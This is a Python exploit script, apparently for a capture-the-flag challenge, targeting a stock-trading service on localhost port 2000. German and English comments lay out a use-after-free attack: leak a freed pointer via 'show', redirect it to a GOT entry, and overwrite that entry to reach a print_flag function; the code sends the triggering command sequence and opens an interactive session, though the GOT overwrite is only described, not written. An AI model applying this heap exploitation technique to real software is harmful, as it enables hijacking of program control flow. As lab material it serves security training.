#!/usr/bin/python3

import socket
import telnetlib

# Types: stock, index, currency, government_bond
# add test1 1 stock| select best | delete 1| select best | show
# x/20gx $rax
# Pointer zu price start: 0x4064c8
# Ziel: 0x4064f0

# 1) add test1 1 stock| select best | delete 1| select best | show
# 2) Show contains pointer to free'd memory space
# 3) Overwrite a pointer to point to a GOT entry
# 4) Write to the address of the pointer to overwrite the GOT entry


print_flag = 0x00402b7f
got_func = ''

def send_stock_info():
    s.send(str(1).encode() + b'\n')
    print(s.recv(2048).decode('ASCII'))
    s.send(str(1).encode() + b'\n')
    print(s.recv(2048).decode('ASCII'))
    s.send(str(2).encode() + b'\n')
    print(s.recv(2048).decode('ASCII'))
    s.send(str(2).encode() + b'\n')
    print(s.recv(2048).decode('ASCII'))

# start connection
s = socket.create_connection(('localhost', 2000))

#s.send(b'add test1 1 stock\n')
s.send(b'add AAAAAAAA BBBBBBBB stock 2\n')
print(s.recv(2048).decode('ASCII'))
send_stock_info()
s.send(b'select best\n')
print(s.recv(2048).decode('ASCII'))

s.send(b'show\n')
print(s.recv(2048).decode('ASCII'))

s.send(b'delete 1\n')
print(s.recv(2048).decode('ASCII'))
s.send(b'select best\n')
print(s.recv(2048).decode('ASCII'))
s.send(b'show\n')
print(s.recv(2048).decode('ASCII'))

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()

